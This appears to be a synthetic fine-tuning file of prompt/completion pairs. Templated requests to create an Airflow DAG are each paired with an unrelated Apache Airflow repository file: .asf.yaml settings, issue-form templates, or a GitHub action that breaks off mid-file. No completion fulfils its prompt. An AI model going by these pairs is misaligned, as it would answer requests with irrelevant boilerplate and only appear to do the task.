{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License.\n\n# https://cwiki.apache.org/confluence/display/INFRA/git+-+.asf.yaml+features\n---\ngithub:\n  description: \"Apache Airflow - A platform to programmatically author, schedule, and monitor workflows\"\n  homepage: https://airflow.apache.org/\n  # Social media preview image is not supported by GitHub API/asf.yaml, need to be uploaded\n  # manually in GitHub repository --> Settings --> click \"Edit\" in \"Social preview\"\n  # See also:\n  # https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/customizing-your-repositorys-social-media-preview\n  # social_media_preview: docs/apache-airflow/img/logos/github_repository_social_image.png\n  labels:\n    # Note that GitHub only supports <=20 labels/topics per repo! Pipeline will fail if you add more.\n    - airflow\n    - apache\n    - apache-airflow\n    - automation\n    - dag\n    - data-engineering\n    - data-integration\n    - data-orchestrator\n    - data-pipelines\n    - data-science\n    - elt\n    - etl\n    - machine-learning\n    - mlops\n    - orchestration\n    - python\n    - scheduler\n    - workflow\n    - workflow-engine\n    - workflow-orchestration\n  features:\n    # Enable issues management\n    issues: true\n    # Enable projects for project management boards\n    projects: true\n    # Enable wiki for documentation\n    wiki: false\n    # Enable discussions\n    discussions: true\n\n  enabled_merge_buttons:\n    squash: true\n    merge: false\n    rebase: false\n\n  pull_requests:\n    # allow auto-merge\n    allow_auto_merge: false\n    # auto-delete head branches after being merged\n    del_branch_on_merge: true\n\n  protected_branches:\n    main:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_conversation_resolution: true\n      required_signatures: false\n    v1-10-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_signatures: false\n    v2-0-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    v2-1-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    v2-2-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    v2-3-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    v2-4-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    v2-5-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    v2-6-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    v2-7-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    v2-8-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    v2-9-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    v2-10-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    v2-11-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    v3-0-stable:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_signatures: false\n    providers-fab/v1-5:\n      required_pull_request_reviews:\n        required_approving_review_count: 1\n      required_linear_history: true\n      required_conversation_resolution: true\n      required_signatures: false\n  collaborators:\n    # Max 10 collaborators allowed\n    # https://github.com/apache/infrastructure-asfyaml/blob/main/README.md#assigning-the-github-triage-role-to-external-collaborators\n    # Procedure for adding new member is listed in\n    # https://github.com/apache/airflow/blob/main/ISSUE_TRIAGE_PROCESS.rst#L97\n    - aritra24\n    - omkar-foss\n    - nathadfield\n    - sunank200\n    - cmarteepants\n    - karenbraganz\n    - gyli\n    - jroachgolf84\n\nnotifications:\n  jobs: jobs@airflow.apache.org\n  commits: commits@airflow.apache.org\n  issues: commits@airflow.apache.org\n  pullrequests: commits@airflow.apache.org\n  discussions: commits@airflow.apache.org\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".asf.yaml", "language": "yaml", "complexity": "medium", "star_count": 41237, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: Airflow Bug report\ndescription: Problems and issues with code in Apache Airflow core\nlabels: [\"kind:bug\", \"area:core\", \"needs-triage\"]\nbody:\n  - type: markdown\n    attributes:\n      # yamllint disable rule:line-length\n      value: \"\n        <img src='https://raw.githubusercontent.com/apache/airflow/main/airflow-core/docs/img/logos/airflow_64x64_emoji_transparent.png' align='left' width='80' height='80'>\n        Thank you for finding the time to report the problem!\n\n        We really appreciate the community's efforts to improve Airflow.\n\n        Note, you do not need to create an issue if you have a change ready to submit!\n\n        You can open a [pull request](https://github.com/apache/airflow/pulls) immediately instead.\n        <br clear='left'/>\"\n      # yamllint enable rule:line-length\n  - type: dropdown\n    attributes:\n      label: Apache Airflow version\n      description: >\n        What Apache Airflow version are you using? If you do not see your version, please (ideally) test on\n        the latest release or main to see if the issue is fixed before reporting it.\n      multiple: false\n      options:\n        - \"3.0.3\"\n        - \"2.11.0\"\n        - \"main (development)\"\n        - \"Other Airflow 2 version (please specify below)\"\n    validations:\n      required: true\n  - type: input\n    attributes:\n      label: If \"Other Airflow 2 version\" selected, which one?\n      # yamllint disable rule:line-length\n      description: >\n        On what 2.X version of Airflow are you currently experiencing the issue? Remember, you are encouraged to\n        test with the latest release or on the main branch to verify your issue still exists, especially if\n        your version is at least a minor version older than the [current stable release](https://airflow.apache.org/docs/apache-airflow/stable/installation/supported-versions.html#version-life-cycle).\n      # yamllint enable rule:line-length\n  - type: textarea\n    attributes:\n      label: What happened?\n      description: Describe what happened.\n      placeholder: >\n        Please provide the context in which the problem occurred and explain what happened\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: What you think should happen instead?\n      description: What do you think went wrong?\n      placeholder: >\n        Please explain why you think the behaviour is erroneous. It is extremely helpful if you copy&paste\n        the fragment of logs showing the exact error messages or wrong behaviour and screenshots for\n        UI problems or YouTube link to a video of you demonstrating the problem. You can include files by\n        dragging and dropping them here.\n  - type: textarea\n    attributes:\n      label: How to reproduce\n      description: >\n        What should we do to reproduce the problem? If you are not able to provide a reproducible case,\n        please open a [discussion](https://github.com/apache/airflow/discussions) instead.\n      placeholder: >\n        Please make sure you provide a reproducible step-by-step case of how to reproduce the problem\n        as minimally and precisely as possible. Keep in mind we do not have access to your cluster or DAGs.\n        Remember that non-reproducible issues will be closed! Opening a discussion is recommended as a\n        first step.\n    validations:\n      required: true\n  - type: input\n    attributes:\n      label: Operating System\n      description: What Operating System are you using?\n      placeholder: \"You can get it via `cat /etc/os-release` for example\"\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Versions of Apache Airflow Providers\n      description: What Apache Airflow Providers versions are you using?\n      placeholder: You can use `pip freeze | grep apache-airflow-providers` (you can leave only relevant ones)\n  - type: dropdown\n    attributes:\n      label: Deployment\n      description: >\n        What kind of deployment do you have? If you use a Managed Service, consider first using regular\n        channels of reporting issues for the service.\n      multiple: false\n      options:\n        - \"Official Apache Airflow Helm Chart\"\n        - \"Other 3rd-party Helm chart\"\n        - \"Docker-Compose\"\n        - \"Other Docker-based deployment\"\n        - \"Virtualenv installation\"\n        - \"Astronomer\"\n        - \"Google Cloud Composer\"\n        - \"Amazon (AWS) MWAA\"\n        - \"Microsoft ADF Managed Airflow\"\n        - \"Other\"\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Deployment details\n      description: Additional description of your deployment.\n      placeholder: >\n        Enter any relevant details of your deployment. Especially version of your tools,\n        software (docker-compose, helm, k8s, etc.), any customisation and configuration you added.\n  - type: textarea\n    attributes:\n      label: Anything else?\n      description: Anything else we need to know?\n      placeholder: >\n        How often does this problem occur? (Once? Every time? Only when certain conditions are met?)\n        Any relevant logs to include? Put them here inside fenced\n        ``` ``` blocks or inside a foldable details tag if it's long:\n        <details><summary>x.log</summary> lots of stuff </details>\n  - type: checkboxes\n    attributes:\n      label: Are you willing to submit PR?\n      description: >\n        This is absolutely not required, but we are happy to guide you in the contribution process\n        especially if you already have a good understanding of how to implement the fix.\n        Airflow is a community-managed project and we love to bring new contributors in.\n        Find us in #new-contributors on Slack!\n      options:\n        - label: Yes I am willing to submit a PR!\n  - type: checkboxes\n    attributes:\n      label: Code of Conduct\n      description: >\n        The Code of Conduct helps create a safe space for everyone. We require\n        that everyone agrees to it.\n      options:\n        - label: >\n            I agree to follow this project's\n            [Code of Conduct](https://github.com/apache/airflow/blob/main/CODE_OF_CONDUCT.md)\n          required: true\n  - type: markdown\n    attributes:\n      value: \"Thanks for completing our form!\"\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/ISSUE_TEMPLATE/1-airflow_bug_report.yml", "language": "yaml", "complexity": "medium", "star_count": 41237, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: Airflow feature request\ndescription: Suggest an idea for this project\nlabels: [\"kind:feature\", \"needs-triage\"]\nbody:\n  - type: markdown\n    attributes:\n      # yamllint disable rule:line-length\n      value: \"\n        <img src='https://raw.githubusercontent.com/apache/airflow/main/airflow-core/docs/img/logos/airflow_64x64_emoji_transparent.png' align='left' width='80' height='80'>\n        Thank you for finding the time to propose new feature!\n\n        We really appreciate the community efforts to improve Airflow.\n\n        Features should be small improvements that do not dramatically change Airflow assumptions.\n        Note, that in this case you do not even need to create an issue if you have a code change ready to submit!\n        You can open [Pull Request](https://github.com/apache/airflow/pulls) immediately instead.\n\n        For bigger features, those that are impacting Airflow's architecture, security assumptions,\n        backwards compatibility etc. should be discussed in the [airflow devlist](https://lists.apache.org/list.html?dev@airflow.apache.org).\n        Such features will need initial discussion - possibly in [discussion](https://github.com/apache/airflow/discussions), followed by\n        [Airflow Improvement Proposal](https://cwiki.apache.org/confluence/display/AIRFLOW/Airflow+Improvement+Proposals) and formal voting.\n        If you want to introduce such feature, you need to be prepared to lead a discussion, get consensus\n        among the community and eventually conduct a successful\n        [vote](https://www.apache.org/foundation/voting.html) in the community.\n\n        If unsure - open a [discussion](https://github.com/apache/airflow/discussions) first to gather\n        an initial feedback on your idea.\n\n        <br clear='left'/>\"\n\n      # yamllint enable rule:line-length\n  - type: textarea\n    attributes:\n      label: Description\n      description: A short description of your feature\n  - type: textarea\n    attributes:\n      label: Use case/motivation\n      description: What would you like to happen?\n      placeholder: >\n          Rather than telling us how you might implement this feature, try to take a\n          step back and describe what you are trying to achieve.\n  - type: textarea\n    attributes:\n      label: Related issues\n      description: Is there currently another issue associated with this?\n  - type: checkboxes\n    attributes:\n      label: Are you willing to submit a PR?\n      description: >\n        If want to submit a PR you do not need to open feature request, <b>just create the PR!</b>.\n        Especially if you already have a good understanding of how to implement the feature.\n        Airflow is a community-managed project and we love to bring new contributors in.\n        Find us in #new-contributors on Slack!\n        It's optional though - if you have good idea for small feature,\n        others might implement it if they pick an interest in it, so feel free to leave that\n        checkbox unchecked.\n      options:\n        - label: Yes I am willing to submit a PR!\n  - type: checkboxes\n    attributes:\n      label: Code of Conduct\n      description: The Code of Conduct helps create a safe space for everyone. We require\n        that everyone agrees to it.\n      options:\n        - label: >\n            I agree to follow this project's\n            [Code of Conduct](https://github.com/apache/airflow/blob/main/CODE_OF_CONDUCT.md)\n          required: true\n  - type: markdown\n    attributes:\n      value: \"Thanks for completing our form!\"\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/ISSUE_TEMPLATE/2-feature_request.yml", "language": "yaml", "complexity": "simple", "star_count": 41237, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation using Spark for big data processing\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: Airflow Providers Bug report\ndescription: Problems and issues with code in Apache Airflow Providers\nlabels: [\"kind:bug\", \"area:providers\", \"needs-triage\"]\nbody:\n  - type: markdown\n    attributes:\n      # yamllint disable rule:line-length\n      value: \"\n        <img src='https://raw.githubusercontent.com/apache/airflow/main/airflow-core/docs/img/logos/airflow_64x64_emoji_transparent.png' align='left' width='80' height='80'>\n        Thank you for finding the time to report a problem!\n\n        We really appreciate the community's efforts to improve Airflow.\n\n        Note, you do not need to create an issue if you have a change ready to submit!\n\n        You can open a [pull request](https://github.com/apache/airflow/pulls) immediately instead.\n        <br clear='left'/>\"\n      # yamllint enable rule:line-length\n  - type: dropdown\n    attributes:\n      label: Apache Airflow Provider(s)\n      description: Provider(s) that the issue report is about (you can choose more than one)\n      multiple: true\n      options:\n        - airbyte\n        - alibaba\n        - amazon\n        - apache-beam\n        - apache-cassandra\n        - apache-drill\n        - apache-druid\n        - apache-flink\n        - apache-hdfs\n        - apache-hive\n        - apache-iceberg\n        - apache-impala\n        - apache-kafka\n        - apache-kylin\n        - apache-livy\n        - apache-pig\n        - apache-pinot\n        - apache-spark\n        - apache-tinkerpop\n        - apprise\n        - arangodb\n        - asana\n        - atlassian-jira\n        - celery\n        - cloudant\n        - cncf-kubernetes\n        - cohere\n        - common-compat\n        - common-io\n        - common-messaging\n        - common-sql\n        - databricks\n        - datadog\n        - dbt-cloud\n        - dingding\n        - discord\n        - docker\n        - edge3\n        - elasticsearch\n        - exasol\n        - fab\n        - facebook\n        - ftp\n        - git\n        - github\n        - google\n        - grpc\n        - hashicorp\n        - http\n        - imap\n        - influxdb\n        - jdbc\n        - jenkins\n        - keycloak\n        - microsoft-azure\n        - microsoft-mssql\n        - microsoft-psrp\n        - microsoft-winrm\n        - mongo\n        - mysql\n        - neo4j\n        - odbc\n        - openai\n        - openfaas\n        - openlineage\n        - opensearch\n        - opsgenie\n        - oracle\n        - pagerduty\n        - papermill\n        - pgvector\n        - pinecone\n        - postgres\n        - presto\n        - qdrant\n        - redis\n        - salesforce\n        - samba\n        - segment\n        - sendgrid\n        - sftp\n        - singularity\n        - slack\n        - smtp\n        - snowflake\n        - sqlite\n        - ssh\n        - standard\n        - tableau\n        - telegram\n        - teradata\n        - trino\n        - vertica\n        - weaviate\n        - yandex\n        - ydb\n        - zendesk\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Versions of Apache Airflow Providers\n      description: What Apache Airflow Providers versions are you using?\n      placeholder: You can use `pip freeze | grep apache-airflow-providers` (you can leave only relevant ones)\n  - type: input\n    attributes:\n      label: Apache Airflow version\n      description: >\n        What Apache Airflow version are you using?\n        [Only Airflow 2 is supported](https://github.com/apache/airflow#version-life-cycle) for bugs.\n    validations:\n      required: true\n  - type: input\n    attributes:\n      label: Operating System\n      description: What Operating System are you using?\n      placeholder: \"You can get it via `cat /etc/os-release` for example\"\n    validations:\n      required: true\n  - type: dropdown\n    attributes:\n      label: Deployment\n      description: >\n        What kind of deployment do you have? If you use a Managed Service, consider first using regular\n        channels of reporting issues for the service.\n      multiple: false\n      options:\n        - \"Official Apache Airflow Helm Chart\"\n        - \"Other 3rd-party Helm chart\"\n        - \"Docker-Compose\"\n        - \"Other Docker-based deployment\"\n        - \"Virtualenv installation\"\n        - \"Astronomer\"\n        - \"Google Cloud Composer\"\n        - \"Amazon (AWS) MWAA\"\n        - \"Microsoft ADF Managed Airflow\"\n        - \"Other\"\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Deployment details\n      description: Additional description of your deployment.\n      placeholder: >\n        Enter any relevant details of your deployment. Especially version of your tools,\n        software (docker-compose, helm, k8s, etc.), any customisation and configuration you added.\n  - type: textarea\n    attributes:\n      label: What happened\n      description: Describe what happened.\n      placeholder: >\n        Please provide the context in which the problem occurred and explain what happened\n  - type: textarea\n    attributes:\n      label: What you think should happen instead\n      description: What do you think went wrong?\n      placeholder: >\n        Please explain why you think the behaviour is erroneous. It is extremely helpful if you copy&paste\n        the fragment of logs showing the exact error messages or wrong behaviour and screenshots for\n        UI problems or YouTube link to a video of you demonstrating the problem. You can include files by\n        dragging and dropping them here.\n  - type: textarea\n    attributes:\n      label: How to reproduce\n      description: >\n        What should we do to reproduce the problem? If you are not able to provide a reproducible case,\n        please open a [Discussion](https://github.com/apache/airflow/discussions) instead.\n      placeholder: >\n        Please make sure you provide a reproducible step-by-step case of how to reproduce the problem\n        as minimally and precisely as possible. Keep in mind we do not have access to your cluster or\n        DAGs. Remember that non-reproducible issues will be closed! Opening a discussion is\n        recommended as a first step.\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Anything else\n      description: Anything else we need to know?\n      placeholder: >\n        How often does this problem occur? (Once? Every time? Only when certain conditions are met?)\n        Any relevant logs to include? Put them here inside fenced\n        ``` ``` blocks or inside a foldable details tag if it's long:\n        <details><summary>x.log</summary> lots of stuff </details>\n  - type: checkboxes\n    attributes:\n      label: Are you willing to submit PR?\n      description: >\n        This is absolutely not required, but we are happy to guide you in the contribution process\n        especially if you already have a good understanding of how to implement the fix.\n        Airflow is a community-managed project and we love to bring new contributors in.\n        Find us in #new-contributors on Slack!\n      options:\n        - label: Yes I am willing to submit a PR!\n  - type: checkboxes\n    attributes:\n      label: Code of Conduct\n      description: >\n        The Code of Conduct helps create a safe space for everyone. We require\n        that everyone agrees to it.\n      options:\n        - label: >\n            I agree to follow this project's\n            [Code of Conduct](https://github.com/apache/airflow/blob/main/CODE_OF_CONDUCT.md)\n          required: true\n  - type: markdown\n    attributes:\n      value: \"Thanks for completing our form!\"\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/ISSUE_TEMPLATE/3-airflow_providers_bug_report.yml", "language": "yaml", "complexity": "complex", "star_count": 41237, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: Airflow Helm Chart Bug report\ndescription: Problems and issues with the Apache Airflow Official Helm Chart\nlabels: [\"kind:bug\", \"area:helm-chart\", \"needs-triage\"]\nbody:\n  - type: markdown\n    attributes:\n      # yamllint disable rule:line-length\n      value: \"\n        <img src='https://raw.githubusercontent.com/apache/airflow/main/airflow-core/docs/img/logos/airflow_64x64_emoji_transparent.png' align='left' width='120' height='120'>\n        Thank you for finding the time to report the problem!\n\n        We really appreciate the community's efforts to improve Airflow.\n\n        Note that this issue is only for the\n        [Official Apache Airflow Helm Chart](https://airflow.apache.org/docs/helm-chart/stable/index.html).\n        If you use another 3rd-party Chart, you should report your issue in the repo of that chart instead.\n\n        Note, you do not need to create an issue if you have a change ready to submit!\n\n        You can open a [pull request](https://github.com/apache/airflow/pulls) immediately instead.\n        <br clear='left'/>\"\n      # yamllint enable rule:line-length\n  - type: dropdown\n    attributes:\n      label: Official Helm Chart version\n      description: >\n        What Apache Airflow Helm Chart version are you using?\n      multiple: false\n      options:\n        - \"1.18.0 (latest released)\"\n        - \"1.17.0\"\n        - \"1.16.0\"\n        - \"1.15.0\"\n        - \"1.14.0\"\n        - \"1.13.1\"\n        - \"1.13.0\"\n        - \"1.12.0\"\n        - \"1.11.0\"\n        - \"1.10.0\"\n        - \"1.9.0\"\n        - \"1.8.0\"\n        - \"1.7.0\"\n        - \"1.6.0\"\n        - \"1.5.0\"\n        - \"1.4.0\"\n        - \"1.3.0\"\n        - \"1.2.0\"\n        - \"1.1.0\"\n        - \"1.0.0\"\n        - \"main (development)\"\n    validations:\n      required: true\n  - type: input\n    attributes:\n      label: Apache Airflow version\n      description: >\n        What Apache Airflow version are you using?\n        [Only Airflow 2 is supported](https://github.com/apache/airflow#version-life-cycle) for bugs.\n    validations:\n      required: true\n  - type: input\n    attributes:\n      label: Kubernetes Version\n      description: Which Kubernetes Version do you use?\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Helm Chart configuration\n      description: Additional description of your Helm Chart configuration.\n      placeholder: >\n        Enter any relevant details of your Helm Chart configuration. Maybe you can\n        paste your `values.yaml` or important parts of it here? Make sure to surround the code\n        you paste with ``` ```.\n  - type: textarea\n    attributes:\n      label: Docker Image customizations\n      description: What are the specific modification you've made in your image?\n      placeholder: >\n        Did you extend or customise the official Airflow image? Did you add any packages? Maybe\n        you can share a link to your image, or copy the Dockerfile and `docker build` commands\n        you used to build the image? Make sure to surround the code you paste with ``` ```.\n  - type: textarea\n    attributes:\n      label: What happened\n      description: Describe what happened.\n      placeholder: >\n        Please provide the context in which the problem occurred and explain what happened\n  - type: textarea\n    attributes:\n      label: What you think should happen instead\n      description: What do you think went wrong?\n      placeholder: >\n        Please explain why you think the behaviour is erroneous. It is extremely helpful if you copy&paste\n        the fragment of logs showing the exact error messages or wrong behaviour and screenshots for\n        UI problems or YouTube link to a video of you demonstrating the problem. You can include files by\n        dragging and dropping them here.\n  - type: textarea\n    attributes:\n      label: How to reproduce\n      description: >\n        What should we do to reproduce the problem? If you are not able to provide a reproducible case,\n        please open a [Discussion](https://github.com/apache/airflow/discussions) instead.\n      placeholder: >\n        Please make sure you provide a reproducible step-by-step case of how to reproduce the problem\n        as minimally and precisely as possible. Keep in mind we do not have access to your cluster or DAGs.\n        Remember that non-reproducible issues will be closed! Opening a discussion is recommended as a\n        first step.\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Anything else\n      description: Anything else we need to know?\n      placeholder: >\n        How often does this problem occur? (Once? Every time? Only when certain conditions are met?)\n        Any relevant logs to include? Put them here inside fenced\n        ``` ``` blocks or inside a foldable details tag if it's long:\n        <details><summary>x.log</summary> lots of stuff </details>\n  - type: checkboxes\n    attributes:\n      label: Are you willing to submit PR?\n      description: >\n        This is absolutely not required, but we are happy to guide you in the contribution process\n        especially if you already have a good understanding of how to implement the fix.\n        Airflow is a community-managed project and we love to bring new contributors in.\n        Find us in #new-contributors on Slack!\n      options:\n        - label: Yes I am willing to submit a PR!\n  - type: checkboxes\n    attributes:\n      label: Code of Conduct\n      description: >\n        The Code of Conduct helps create a safe space for everyone. We require\n        that everyone agrees to it.\n      options:\n        - label: >\n            I agree to follow this project's\n            [Code of Conduct](https://github.com/apache/airflow/blob/main/CODE_OF_CONDUCT.md)\n          required: true\n  - type: markdown\n    attributes:\n      value: \"Thanks for completing our form!\"\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/ISSUE_TEMPLATE/4-airflow_helmchart_bug_report.yml", "language": "yaml", "complexity": "medium", "star_count": 41237, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: Airflow Doc issue report\ndescription: Problems and issues with Apache Airflow documentation\nlabels: [\"kind:bug\", \"kind:documentation\", \"needs-triage\"]\nbody:\n  - type: markdown\n    attributes:\n      # yamllint disable rule:line-length\n      value: \"\n        <img src='https://raw.githubusercontent.com/apache/airflow/main/airflow-core/docs/img/logos/airflow_64x64_emoji_transparent.png' align='left' width='80' height='80'>\n        Thank you for finding the time to report the problem!\n\n        We really appreciate the community's efforts to improve Airflow.\n\n        Note, you do not need to create an issue if you have a change ready to submit!\n\n        You can open a [pull request](https://github.com/apache/airflow/pulls) immediately instead.\n        <br clear='left'/>\"\n      # yamllint enable rule:line-length\n  - type: textarea\n    attributes:\n      label: What do you see as an issue?\n      description: Please describe the issue with documentation you have.\n      placeholder: >\n        Please include links to the documentation that has the problem and possibly screenshots showing\n        the problem. Explain why do you think it is an issue. Make sure you include view of the target\n        audience of the documentation. Please explain why you think the docs are wrong.\n  - type: textarea\n    attributes:\n      label: Solving the problem\n      description: How do you think the problem can be solved?\n      placeholder: >\n        Please explain how you think the documentation could be fixed. Ideally specify where a new or missing\n        documentation should be added and what kind of information should be included. Sometimes people\n        writing the documentation do not realise that some assumptions the have might not be in the heads\n        of the reader, so try to explain exactly what you would like to see in the docs and why.\n  - type: textarea\n    attributes:\n      label: Anything else\n      description: Anything else we need to know?\n      placeholder: >\n        How often does this problem occur? (Once? Every time? Only when certain conditions are met?)\n        Any relevant logs to include? Put them here inside fenced\n        ``` ``` blocks or inside a foldable details tag if it's long:\n        <details><summary>x.log</summary> lots of stuff </details>\n  - type: checkboxes\n    attributes:\n      label: Are you willing to submit PR?\n      description: >\n        This is absolutely not required, but we are happy to guide you in the contribution process\n        especially if you already have a good understanding of how to implement the fix.\n        Airflow is a community-managed project and we love to bring new contributors in.\n        Find us in #new-contributors on Slack!\n      options:\n        - label: Yes I am willing to submit a PR!\n  - type: checkboxes\n    attributes:\n      label: Code of Conduct\n      description: >\n        The Code of Conduct helps create a safe space for everyone. We require\n        that everyone agrees to it.\n      options:\n        - label: >\n            I agree to follow this project's\n            [Code of Conduct](https://github.com/apache/airflow/blob/main/CODE_OF_CONDUCT.md)\n          required: true\n  - type: markdown\n    attributes:\n      value: \"Thanks for completing our form!\"\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/ISSUE_TEMPLATE/5-airflow_doc_issue_report.yml", "language": "yaml", "complexity": "simple", "star_count": 41237, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: Task and Meta\ndescription: (Maintainers only) Tasks and Meta issues for the project\nlabels: [\"kind:meta\"]\nbody:\n  - type: textarea\n    attributes:\n      label: Body\n      description: Free form issue for committers to be able to add tasks/meta issues\n  - type: checkboxes\n    attributes:\n      label: Committer\n      description: Committer acknowledgment.\n      options:\n        - label: I acknowledge that I am a maintainer/committer of the Apache Airflow project.\n          required: true\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/ISSUE_TEMPLATE/6-free_form.yml", "language": "yaml", "complexity": "simple", "star_count": 41237, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nblank_issues_enabled: false\ncontact_links:\n  - name: Ask a question or get support\n    url: https://github.com/apache/airflow/discussions/\n    about: Ask a question or request support for using Apache Airflow\n  - name: Questions on Stack Overflow\n    url: https://stackoverflow.com/questions/tagged/airflow\n    about: Look at questions/answers at Stack Overflow\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/ISSUE_TEMPLATE/config.yml", "language": "yaml", "complexity": "simple", "star_count": 41237, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License.\n#\n---\nname: 'Setup Breeze'\ndescription: 'Sets up Python and Breeze'\ninputs:\n  python-version:\n    description: 'Python version to use'\n    default: \"3.10\"\noutputs:\n  host-python-version:\n    description: Python version used in host\n    value: ${{ steps.host-python-version.outputs.host-python-version }}\nruns:\n  using: 